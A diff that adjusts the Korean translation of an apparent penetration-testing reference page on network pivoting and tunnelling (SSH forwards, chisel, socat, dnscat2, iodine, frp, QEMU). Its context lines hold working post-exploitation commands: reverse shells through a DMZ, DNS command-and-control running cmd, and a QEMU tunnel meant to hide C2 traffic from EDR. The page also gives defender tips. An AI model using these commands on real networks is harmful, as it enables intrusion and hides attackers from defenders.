@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐색을 비활성화**해야 합니다 (`-Pn`) 및 **TCP 스캔**을 지정해야 합니다 (`-sT`) 이 작업이 수행되도록 합니다.
+> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐지**를 **비활성화**해야 합니다 (`-Pn`) 그리고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
 
 ## **Bash**
 
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-로컬 포트 --> 손상된 호스트 (SSH) --> 제3의 박스:포트
+로컬 포트 --> 손상된 호스트 (SSH) --> Third_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -55,7 +55,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### 리버스 포트 포워딩
+### Reverse Port Forwarding
 
 이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
 ```bash
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치에서 **루트 권한이 필요합니다** (새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
+두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **보안 – 테라핀 공격 (CVE-2023-48795)**
-> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
+> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 변조하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
 
 ## SSHUTTLE
 
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS 프록시
 
-모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**할 수 있습니다.
+모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -178,8 +178,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
-클라이언트와 서버에 **같은 버전**을 사용해야 합니다.
+You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+**클라이언트와 서버에 동일한 버전을 사용해야 합니다.**
 
 ### socks
 ```bash
@@ -296,7 +296,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat 터널
+### SSL Socat Tunnel
 
 **/bin/sh 콘솔**
 
@@ -347,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**시스템에 대한 RDP 액세스가 필요합니다.**\
+**RDP 액세스가 시스템에 필요합니다.**\
 다운로드:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 터널링하는** 역할을 합니다.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통한 패킷 터널링**을 담당합니다.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드합니다:
@@ -415,13 +415,13 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
+터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성하려면 다음을 사용하십시오:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
+[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**
 
 DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
 ```bash
@@ -434,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell에서**
 
-PowerShell에서 dnscat2 클라이언트를 실행하려면 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용할 수 있습니다:
+[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용하여 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -444,11 +444,11 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### 프록시체인 DNS 변경
+#### Proxychains DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다(하드코딩됨). 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경합니다. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
-## Go의 터널
+## Go에서의 터널
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -459,7 +459,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOC
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하여 TUN 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 tun 어댑터를 생성하고 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -608,11 +608,11 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-위 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.
+위의 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.
 
 ## QEMU를 이용한 은밀한 VM 기반 터널
 
-QEMU의 사용자 모드 네트워킹(`-netdev user`)은 `hostfwd`라는 옵션을 지원하며, 이는 **호스트의 TCP/UDP 포트를 바인딩하고 이를 *게스트*로 전달**합니다. 게스트가 전체 SSH 데몬을 실행할 때, hostfwd 규칙은 일회용 SSH 점프 박스를 제공하며, 이는 완전히 일시적인 VM 내부에 존재합니다 – 모든 악성 활동과 파일이 가상 디스크에 남아 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.
+QEMU의 사용자 모드 네트워킹(`-netdev user`)은 `hostfwd`라는 옵션을 지원하며, 이는 **호스트의 TCP/UDP 포트를 바인딩하고 이를 *게스트*로 전달합니다**. 게스트가 전체 SSH 데몬을 실행할 때, hostfwd 규칙은 일회용 SSH 점프 박스를 제공하며, 이는 완전히 임시 VM 내에서 살아 있습니다 – 모든 악성 활동과 파일이 가상 디스크에 남아 있기 때문에 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.
 
 ### 간단한 원라이너
 ```powershell
@@ -626,7 +626,7 @@ qemu-system-x86_64.exe ^
 ```
 • 위의 명령은 **Tiny Core Linux** 이미지(`tc.qcow2`)를 RAM에서 실행합니다.  
 • Windows 호스트의 포트 **2222/tcp**는 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.  
-• 공격자의 관점에서 대상은 단순히 포트 2222를 노출합니다; 이 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버에 의해 처리됩니다.  
+• 공격자의 관점에서 대상은 단순히 포트 2222를 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버에 의해 처리됩니다.  
 
 ### VBScript를 통한 은밀한 실행
 ```vb
@@ -653,12 +653,12 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### 왜 이것이 탐지를 피하는가
 
 • 두 개의 서명되지 않은 실행 파일(`qemu-system-*.exe`)만이 디스크에 접근하며, 드라이버나 서비스는 설치되지 않습니다.
-• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 감지합니다(실제 C2는 VM 내부에서 종료됩니다).
+• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 봅니다 (실제 C2는 VM 내부에서 종료됩니다).
 • 메모리 스캐너는 악성 프로세스 공간을 분석하지 않으며, 이는 다른 OS에 존재합니다.
 
 ### Defender 팁
 
-• 사용자 쓰기 가능한 경로에 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 대해 경고합니다.
+• 사용자 쓰기 가능한 경로에 있는 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 경고합니다.
 • `qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단합니다.
 • QEMU 시작 직후 즉시 바인딩되는 드문 리스닝 포트(2222, 10022, …)를 추적합니다.
 
@@ -669,7 +669,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-## 참고문헌
+## 참고 문헌
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
